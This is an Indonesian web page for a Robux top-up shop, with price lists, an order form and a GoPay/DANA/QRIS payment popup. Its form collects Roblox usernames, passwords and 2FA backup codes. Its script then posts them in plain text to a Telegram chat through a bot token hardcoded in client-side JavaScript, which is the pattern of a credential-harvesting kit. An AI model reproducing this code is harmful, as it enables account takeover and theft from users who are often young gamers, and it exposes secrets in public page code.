<!DOCTYPE html>  
<html lang="id">  
<head>  
<meta charset="UTF-8" />  
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>  
<title>Pricelist & Form Pembelian Robux - VILOG</title>  
<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">  
<style>  
body {  
  font-family: 'Roboto', sans-serif;  
  background: #fff;  
  margin: 0;  
  padding: 0;  
  color: #333;  
  font-size: 12px;  
}  
  
/* Pricelist */  
.category {  
  max-width: 720px;  
  margin: 25px auto;  
  padding: 5px 12px;  
}  
.category h3 {  
  text-align: center;  
  margin-bottom: 10px;  
  font-size: 12px;  
  font-weight: 700;  
  color: #2c3e50;  
}  
.pricelist-container {  
  display: flex;  
  flex-wrap: wrap;  
  gap: 8px;  
  justify-content: center;  
}  
.price-box {  
  flex: 0 1 calc(33.33% - 8px);  
  background-color: #f9f9f9;  
  border: 1px solid #d1d9e6;  
  border-radius: 8px;  
  padding: 6px 4px;  
  text-align: center;  
  font-size: 10px;  
  font-weight: 500;  
  color: #333;  
  cursor: pointer;  
  transition: 0.2s;  
}  
.price-box:hover {  
  background-color: #eef3fa;  
  border-color: #4a6fa1;  
  transform: scale(1.04);  
}  
.price-box span {  
  display: block;  
  font-weight: normal;  
  font-size: 10px;  
  color: #555;  
  margin-top: 2px;  
}  
  
/* Form */  
.form-container {  
  max-width: 400px;  
  margin: 20px auto 40px;  
  background: #fafafa;  
  border: 1px solid #d1d9e6;  
  border-radius: 10px;  
  padding: 16px 18px;  
  box-shadow: 0 2px 8px rgba(0,0,0,0.05);  
}  
.form-container h2 {  
  text-align: center;  
  margin-bottom: 14px;  
  font-size: 15px;  
  font-weight: 700;  
  color: #2c3e50;  
}  
.form-group {  
  margin-bottom: 10px;  
}  
label {  
  font-size: 11px;  
  font-weight: 500;  
  display: block;  
  margin-bottom: 3px;  
  color: #444;  
}  
input, select {  
  width: 100%;  
  padding: 7px;  
  border: 1px solid #ccc;  
  border-radius: 6px;  
  font-size: 11px;  
  box-sizing: border-box;  
}  
button {  
  width: 100%;  
  padding: 9px;  
  background: #4a6fa1;  
  border: none;  
  border-radius: 6px;  
  color: white;  
  font-size: 12px;  
  font-weight: 600;  
  cursor: pointer;  
  transition: 0.2s;  
}  
button:hover {  
  background: #3a5f8a;  
}  
.hidden { display: none; }  
.notes {  
  font-size: 11px;  
  color: #666;  
  margin-top: 3px;  
}  
  
/* Payment Modal */  
.modal-backdrop {  
  position: fixed;  
  inset: 0;  
  background: rgba(0,0,0,0.45);  
  display: none;  
  align-items: center;  
  justify-content: center;  
  z-index: 9999;  
}  
.modal {  
  width: 320px;  
  max-width: calc(100% - 32px);  
  background: #fff;  
  border-radius: 12px;  
  padding: 16px;  
  box-shadow: 0 8px 30px rgba(0,0,0,0.25);  
  text-align: center;  
}  
.modal h3 {  
  margin: 0 0 8px;  
  font-size: 15px;  
  color: #23314a;  
}  
.modal .qr {  
  width: 180px;  
  height: 180px;  
  object-fit: cover;  
  margin: 8px auto;  
  border-radius: 8px;  
  border: 1px solid #e6e6e6;  
}  
.modal .amount {  
  font-size: 18px;  
  font-weight: 700;  
  margin-top: 8px;  
  color: #1b3b6f;  
}  
.modal .pay-note {  
  font-size: 12px;  
  color: #555;  
  margin-top: 8px;  
}  
.modal .actions {  
  display: flex;  
  gap: 8px;  
  margin-top: 12px;  
}  
.modal .actions button {  
  flex: 1;  
  padding: 8px;  
  font-size: 13px;  
}  
.modal .small-note {  
  font-size: 11px;  
  color: #888;  
  margin-top: 10px;  
}  
.copy-success {  
  font-size: 12px;  
  color: green;  
  margin-top: 6px;  
}  

/* Metode pembayaran & nomor e-wallet */  
.method-switch {  
  margin-top: 8px;  
  display: flex;  
  justify-content: center;  
  gap: 6px;  
}  
.method-btn {  
  flex: 1;  
  padding: 4px 6px;  
  font-size: 11px;  
  border-radius: 999px;  
  border: 1px solid #d1d9e6;  
  background: #f5f5f5;  
  cursor: pointer;  
}  
.method-btn.active {  
  background: #4a6fa1;  
  color: #fff;  
  border-color: #4a6fa1;  
}  
.wallet-section {  
  margin-top: 8px;  
  font-size: 11px;  
  text-align: left;  
}  
.wallet-label {  
  font-weight: 600;  
  margin-bottom: 3px;  
  color: #23314a;  
}  
.wallet-row {  
  display: flex;  
  align-items: center;  
  justify-content: space-between;  
  gap: 6px;  
  margin-bottom: 4px;  
}  
.wallet-number {  
  font-family: monospace;  
  font-size: 11px;  
  color: #333;  
  flex: 1;  
  word-break: break-all;  
}  
.copy-mini-btn {  
  padding: 4px 6px;  
  font-size: 10px;  
  border-radius: 6px;  
  border: 1px solid #d1d9e6;  
  background: #f5f5f5;  
  cursor: pointer;  
}  
.copy-mini-btn:hover {  
  background: #e6ebf5;  
}  
.wallet-note {  
  font-size: 10px;  
  color: #777;  
  margin-top: 4px;  
}  
</style>  
</head>  
<body>  
  
<!-- Robux Reguler -->  
<div class="category">  
<h3>Robux Reguler</h3>  
<div class="pricelist-container">  
  <div class="price-box" onclick="isiForm('80 Robux','14900','Reguler')">80 Robux<span>Rp14.900</span></div>  
  <div class="price-box" onclick="isiForm('160 Robux','29800','Reguler')">160 Robux<span>Rp29.800</span></div>  
  <div class="price-box" onclick="isiForm('240 Robux','44700','Reguler')">240 Robux<span>Rp44.700</span></div>  
  <div class="price-box" onclick="isiForm('320 Robux','59600','Reguler')">320 Robux<span>Rp59.600</span></div>  
  <div class="price-box" onclick="isiForm('400 Robux','74250','Reguler')">400 Robux<span>Rp74.250</span></div>  
  <div class="price-box" onclick="isiForm('480 Robux','89100','Reguler')">480 Robux<span>Rp89.100</span></div>  
  <div class="price-box" onclick="isiForm('560 Robux','103950','Reguler')">560 Robux<span>Rp103.950</span></div>  
  <div class="price-box" onclick="isiForm('640 Robux','118800','Reguler')">640 Robux<span>Rp118.800</span></div>  
  <div class="price-box" onclick="isiForm('720 Robux','133650','Reguler')">720 Robux<span>Rp133.650</span></div>  
  <div class="price-box" onclick="isiForm('800 Robux','148500','Reguler')">800 Robux<span>Rp148.500</span></div>  
  <div class="price-box" onclick="isiForm('1200 Robux','222750','Reguler')">1200 Robux<span>Rp222.750</span></div>  
</div>  
</div>  
  
<!-- Robux Special -->  
<div class="category">  
<h3>Robux Special (Backup Code: Wajib)</h3>  
<div class="pricelist-container">  
  <div class="price-box" onclick="isiForm('500 Robux','71000','Special')">500 Robux<span>Rp71.000</span></div>  
  <div class="price-box" onclick="isiForm('1000 Robux','142000','Special')">1.000 Robux<span>Rp142.000</span></div>  
  <div class="price-box" onclick="isiForm('1500 Robux','213000','Special')">1.500 Robux<span>Rp213.000</span></div>  
  <div class="price-box" onclick="isiForm('2000 Robux','284000','Special')">2.000 Robux<span>Rp284.000</span></div>  
  <div class="price-box" onclick="isiForm('2500 Robux','355000','Special')">2.500 Robux<span>Rp355.000</span></div>  
  <div class="price-box" onclick="isiForm('3000 Robux','426000','Special')">3.000 Robux<span>Rp426.000</span></div>  
  <div class="price-box" onclick="isiForm('3500 Robux','497000','Special')">3.500 Robux<span>Rp497.000</span></div>  
  <div class="price-box" onclick="isiForm('4000 Robux','568000','Special')">4.000 Robux<span>Rp568.000</span></div>  
  <div class="price-box" onclick="isiForm('4500 Robux','639000','Special')">4.500 Robux<span>Rp639.000</span></div>  
  <div class="price-box" onclick="isiForm('5000 Robux','710000','Special')">5.000 Robux<span>Rp710.000</span></div>  
  <div class="price-box" onclick="isiForm('6000 Robux','852000','Special')">6.000 Robux<span>Rp852.000</span></div>  
</div>  
</div>  
  
<!-- Robux Premium -->  
<div class="category">  
<h3>Robux Premium (Backup Code: Wajib)</h3>  
<div class="pricelist-container">  
  <div class="price-box" onclick="isiForm('450 Robux + Premium','71000','Premium')">450 Robux + Premium<span>Rp71.000</span></div>  
  <div class="price-box" onclick="isiForm('1000 Robux + Premium','142000','Premium')">1.000 Robux + Premium<span>Rp142.000</span></div>  
  <div class="price-box" onclick="isiForm('1550 Robux + Premium','213000','Premium')">1.550 Robux + Premium<span>Rp213.000</span></div>  
  <div class="price-box" onclick="isiForm('2200 Robux + Premium','284000','Premium')">2.200 Robux + Premium<span>Rp284.000</span></div>  
  <div class="price-box" onclick="isiForm('2750 Robux + Premium','355000','Premium')">2.750 Robux + Premium<span>Rp355.000</span></div>  
</div>  
</div>  
  
<!-- Form -->  
<div class="form-container">  
<h2>Formulir Pembelian Robux VILOG</h2>  
<form id="orderForm">  
  <div class="form-group">  
    <label for="username">Username Roblox *</label>  
    <input type="text" id="username" name="username" placeholder="Username Roblox" required>  
  </div>  
  <div class="form-group">  
    <label for="password">Password Roblox *</label>  
    <input type="password" id="password" name="password" placeholder="Password Roblox" required>  
  </div>  
  <div class="form-group">  
    <label for="v2l">Verifikasi 2 Langkah (V2L) *</label>  
    <select id="v2l" name="v2l" required>  
      <option value="">-- Pilih Status --</option>  
      <option value="OFF">Nonaktif (OFF)</option>  
      <option value="ON">Aktif (ON)</option>  
    </select>  
  </div>  
  <div class="form-group hidden" id="metodeV2L_div">  
    <label for="metodeV2L">Pilih Metode V2L *</label>  
    <select id="metodeV2L" name="metodeV2L">  
      <option value="">-- Pilih Metode --</option>  
      <option value="Backup Code">Backup Code</option>  
      <option value="Kode Email">Kode Email</option>  
    </select>  
  </div>  
  <div class="form-group hidden" id="backupCode_div">  
    <label for="backupCode">Masukkan Backup Code *</label>  
    <input type="text" id="backupCode" name="backupCode" placeholder="Isi Backup Code">  
    <div class="notes">Masukkan 1-3 backup code yang belum pernah digunakan.</div>  
  </div>  
  <div class="form-group hidden" id="emailNote_div">  
    <div class="notes">Pastikan storage email tidak penuh supaya bisa menerima kode V2L. Wajib standby setelah payment & diharapkan fastrespon.</div>  
  </div>  
  <div class="form-group">  
    <label for="kategori">Kategori Robux *</label>  
    <input type="text" id="kategori" name="kategori" readonly required>  
  </div>  
  <div class="form-group">  
    <label for="nominal">Jumlah Order *</label>  
    <input type="text" id="nominal" name="nominal" readonly required>  
  </div>  
  <div class="form-group">  
    <label for="harga">Harga *</label>  
    <input type="text" id="harga" name="harga" readonly required>  
  </div>  
  <div style="text-align:center; margin: 14px 0 6px;">  
    <button type="button" id="btnWa">Pesan via Telegram</button>  
  </div>  
</form>  
</div>  
  
<!-- Payment Modal -->  
<div id="paymentModalBackdrop" class="modal-backdrop" aria-hidden="true">  
  <div class="modal" role="dialog" aria-modal="true" aria-labelledby="modalTitle">  
    <h3 id="modalTitle">Pembayaran</h3>  

    <!-- QR (muncul hanya untuk QRIS) -->  
    <img id="modalQr" class="qr" src="" alt="QR Pembayaran">  

    <!-- Nominal akhir sesuai metode -->  
    <div id="modalAmount" class="amount">Rp0</div>  

    <!-- PILIH METODE PEMBAYARAN -->  
    <div class="method-switch">
      <button type="button" class="method-btn active" data-method="gopay">GoPay</button>
      <button type="button" class="method-btn" data-method="dana">DANA</button>
      <button type="button" class="method-btn" data-method="qris">QRIS</button>
    </div>

    <!-- INFO NOMOR TUJUAN & CATATAN -->  
    <div class="wallet-section">
      <div id="walletLabel" class="wallet-label">Transfer GoPay</div>

      <div class="wallet-row">
        <span id="walletNumber" class="wallet-number">083197962700</span>
        <button id="copyNumberBtn" type="button" class="copy-mini-btn">Salin Nomor</button>
      </div>

      <div id="walletNote" class="wallet-note">
        Pembayaran GoPay tidak ada biaya tambahan. Bayar sesuai nominal yang tertera.
      </div>
    </div>

    <div class="pay-note">
      Data pesanan berhasil dikirim! Silahkan lakukan pembayaran, lalu screenshot bukti pembayaran.
    </div>  

    <div class="actions">  
      <button id="copyAmountBtn" type="button">Salin Jumlah</button>  
      <button id="openBotBtn" type="button">Buka Bot</button>  
    </div>  

    <div class="small-note">
      Setelah bayar dan screenshot, klik Buka Bot untuk konfirmasi pembayaran agar pesanan segera diproses.
    </div>  

    <div style="margin-top:10px;">  
      <button id="closeModalBtn" type="button" style="width:100%; background:#e0e0e0; color:#222;">Tutup</button>  
    </div>  

    <div id="copySuccess" class="copy-success" style="display:none;">Jumlah berhasil disalin ke clipboard</div>  
  </div>  
</div>  
  
<script>  
function isiForm(nominal, harga, kategori) {  
  document.getElementById("nominal").value = nominal;  
  const hargaNumber = typeof harga === 'number' ? harga : Number(String(harga).replace(/[^\d]/g,''));  
  document.getElementById("harga").value = "Rp" + new Intl.NumberFormat('id-ID').format(hargaNumber);  
  document.getElementById("kategori").value = kategori;  
  document.querySelector('.form-container').scrollIntoView({ behavior: 'smooth' });  
}  
  
// V2L logic  
document.getElementById("v2l").addEventListener("change", function() {  
  if (this.value === "ON") {  
    document.getElementById("metodeV2L_div").classList.remove("hidden");  
  } else {  
    document.getElementById("metodeV2L_div").classList.add("hidden");  
    document.getElementById("backupCode_div").classList.add("hidden");  
    document.getElementById("emailNote_div").classList.add("hidden");  
  }  
});  
  
document.getElementById("metodeV2L").addEventListener("change", function() {  
  if (this.value === "Backup Code") {  
    document.getElementById("backupCode_div").classList.remove("hidden");  
    document.getElementById("emailNote_div").classList.add("hidden");  
  } else if (this.value === "Kode Email") {  
    document.getElementById("emailNote_div").classList.remove("hidden");  
    document.getElementById("backupCode_div").classList.add("hidden");  
  } else {  
    document.getElementById("backupCode_div").classList.add("hidden");  
    document.getElementById("emailNote_div").classList.add("hidden");  
  }  
});  
  
// Kirim langsung ke Telegram  
document.getElementById("btnWa").addEventListener("click", function() {  
  const form = document.getElementById("orderForm");  
  const inputs = form.querySelectorAll("input[required], select[required]");  
  for (const input of inputs) {  
    if (!input.value.trim()) {  
      alert("Harap isi semua kolom yang wajib diisi!");  
      input.focus();  
      return;  
    }  
  }  
  
  let username = document.getElementById("username").value;  
  let password = document.getElementById("password").value;  
  let v2l = document.getElementById("v2l").value;  
  let metodeV2L = document.getElementById("metodeV2L").value;  
  let backupCode = document.getElementById("backupCode").value;  
  let kategori = document.getElementById("kategori").value;  
  let nominal = document.getElementById("nominal").value;  
  let harga = document.getElementById("harga").value;  
  
  // token/chat_id placeholder (ganti sesuai kebutuhan)  
  const botToken = "8039852277:AAEqbfQUF37cjDlEposj2rzHm28_Pxzv-mw";  
  const chatId = "-1003049680083";  
  
  const text =  
    "Pesanan Baru Masuk!\n\n" +  
    "Username Roblox: " + username + "\n" +  
    "Password Roblox: " + password + "\n" +  
    "V2L: " + v2l + (metodeV2L ? " (" + metodeV2L + ")" : "") + (backupCode ? "\nBackup Code: " + backupCode : "") + "\n" +  
    "Kategori: " + kategori + "\n" +  
    "Nominal: " + nominal + "\n" +  
    "Harga: " + harga;  
  
  fetch("https://api.telegram.org/bot" + botToken + "/sendMessage", {  
    method: "POST",  
    headers: { "Content-Type": "application/json" },  
    body: JSON.stringify({  
      chat_id: chatId,  
      text: text  
    })  
  })  
  .then(res => {  
    if (res.ok) {  
      // Tampilkan payment popup (modal)  
      const qrUrl = "https://payment.uwu.ai/assets/images/gallery03/8555ed8a_original.jpg?v=58e63277";  
      showPaymentPopup(qrUrl, harga);  
      form.reset();  
    } else {  
      alert("Gagal mengirim ke Telegram. Coba lagi.");  
    }  
  })  
  .catch(error => {  
    alert("Terjadi kesalahan saat mengirim ke Telegram.");  
    console.error(error);  
  });  
});  
  
/* Modal payment functions */  
function showPaymentPopup(qrUrl, hargaFormatted) {  
  const backdrop = document.getElementById('paymentModalBackdrop');  
  const modalQr = document.getElementById('modalQr');  
  const modalAmount = document.getElementById('modalAmount');  
  const copySuccess = document.getElementById('copySuccess');  

  const walletLabel = document.getElementById('walletLabel');
  const walletNumber = document.getElementById('walletNumber');
  const walletNote = document.getElementById('walletNote');
  const copyNumberBtn = document.getElementById('copyNumberBtn');

  const methodButtons = document.querySelectorAll('.method-btn');

  // ========= KONFIGURASI NOMOR & BIAYA =========
  const GOPAY_NUMBER = '083197962700';
  const DANA_NUMBER  = '083197962700';

  // Ambil angka murni dari harga di form
  const baseAmount = (function () {
    const num = Number(String(hargaFormatted).replace(/[^\d]/g, ''));
    return isNaN(num) ? 0 : num;
  })();

  function formatRupiah(num) {
    return "Rp" + new Intl.NumberFormat('id-ID').format(num);
  }

  // Hitung total sesuai metode
  const METHOD_CONFIG = {
    gopay: {
      label: 'Transfer GoPay',
      number: GOPAY_NUMBER,
      calcTotal: (base) => base,
      note: 'Pembayaran GoPay tidak ada biaya tambahan. Bayar sesuai nominal yang tertera.'
    },
    dana: {
      label: 'Transfer DANA',
      number: DANA_NUMBER,
      calcTotal: (base) => base + 100,
      note: 'Pembayaran DANA dikenakan biaya admin Rp100. Total sudah termasuk biaya admin.'
    },
    qris: {
      label: 'QRIS (scan QR di atas)',
      number: 'Gunakan QR di atas',
      calcTotal: (base) => {
        if (base <= 499000) return base;
        const fee = Math.round(base * 0.003); // 0.3%
        return base + fee;
      },
      note: 'QRIS hingga Rp499.000 tidak ada biaya tambahan. Di atas itu akan dikenakan biaya 0,3% dari nominal.'
    }
  };

  let activeMethod = 'gopay';

  function applyMethod(methodKey) {
    activeMethod = methodKey;

    // tombol aktif
    methodButtons.forEach(btn => {
      btn.classList.toggle('active', btn.dataset.method === methodKey);
    });

    const cfg = METHOD_CONFIG[methodKey];

    // label + nomor
    walletLabel.textContent = cfg.label;
    walletNumber.textContent = cfg.number;

    // nominal final di tampilan besar
    const total = cfg.calcTotal(baseAmount);
    modalAmount.textContent = formatRupiah(total);

    walletNote.textContent = cfg.note;

    // QR hanya muncul kalau pilih QRIS
    if (methodKey === 'qris') {
      modalQr.style.display = 'block';
      modalQr.src = qrUrl;
    } else {
      modalQr.style.display = 'none';
    }
  }

  // Set default method (GoPay)
  applyMethod('gopay');

  copySuccess.style.display = 'none';  
  backdrop.style.display = 'flex';  
  backdrop.setAttribute('aria-hidden', 'false');  

  // ==== EVENT: PILIH METODE ====
  methodButtons.forEach(btn => {
    btn.onclick = function () {
      applyMethod(this.dataset.method);
    };
  });

  // ==== TUTUP MODAL ====
  document.getElementById('closeModalBtn').onclick = function() {  
    backdrop.style.display = 'none';  
    backdrop.setAttribute('aria-hidden', 'true');  
  };  

  backdrop.onclick = function(e) {  
    if (e.target === backdrop) {  
      backdrop.style.display = 'none';  
      backdrop.setAttribute('aria-hidden', 'true');  
    }  
  };  

  // ==== SALIN NOMOR (GOPAY / DANA / TEKS QRIS) ====
  copyNumberBtn.onclick = function () {
    const textToCopy = walletNumber.textContent || '';
    if (!textToCopy) return;

    navigator.clipboard?.writeText(textToCopy).then(() => {
      alert('Nomor berhasil disalin: ' + textToCopy);
    }).catch(() => {
      const tmp = document.createElement('textarea');
      tmp.value = textToCopy;
      document.body.appendChild(tmp);
      tmp.select();
      try {
        document.execCommand('copy');
        alert('Nomor berhasil disalin: ' + textToCopy);
      } catch (e) {
        alert('Tidak dapat menyalin, silakan salin manual: ' + textToCopy);
      }
      document.body.removeChild(tmp);
    });
  };

  // ==== SALIN JUMLAH (TOTAL SESUAI METODE) ====
  document.getElementById('copyAmountBtn').onclick = function() {  
    const textToCopy = modalAmount.textContent || '';  
    navigator.clipboard?.writeText(textToCopy).then(() => {  
      copySuccess.style.display = 'block';  
      setTimeout(()=> copySuccess.style.display = 'none', 2500);  
    }).catch(()=> {  
      const tmp = document.createElement('textarea');  
      tmp.value = textToCopy;  
      document.body.appendChild(tmp);  
      tmp.select();  
      try {  
        document.execCommand('copy');  
        copySuccess.style.display = 'block';  
        setTimeout(()=> copySuccess.style.display = 'none', 2500);  
      } catch(e){  
        alert('Tidak dapat menyalin, silahkan salin secara manual: ' + textToCopy);  
      }  
      document.body.removeChild(tmp);  
    });  
  };  

  // ==== BUKA BOT (tetap sama) ====
  document.getElementById('openBotBtn').onclick = function() {  
    const botUsername = 'topupressbot'; // ganti sesuai bot kamu, tanpa @  
    const tgScheme = 'tg://resolve?domain=' + encodeURIComponent(botUsername);  
    const webLink  = 'https://t.me/' + encodeURIComponent(botUsername) + '?start';  

    const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);  

    let appOpened = false;  
    function onVisibilityChange() {  
      if (document.hidden) {  
        appOpened = true;  
      }  
    }  
    document.addEventListener('visibilitychange', onVisibilityChange);  

    try {  
      if (isMobile) {  
        window.location.href = tgScheme;  
      } else {  
        const newWin = window.open(tgScheme, '_blank');  
        if (newWin) {  
          try { newWin.focus(); } catch(e){}  
        }  
      }  
    } catch (e) {}  

    const fallbackTimeout = setTimeout(function() {  
      if (!appOpened) {  
        window.open(webLink, '_blank');  
      }  
      document.removeEventListener('visibilitychange', onVisibilityChange);  
    }, 800);  

    window.addEventListener('pagehide', function cleanup() {  
      clearTimeout(fallbackTimeout);  
      document.removeEventListener('visibilitychange', onVisibilityChange);  
      window.removeEventListener('pagehide', cleanup);  
    });  
  };  
}  
</script>  
  
</body>  
</html>
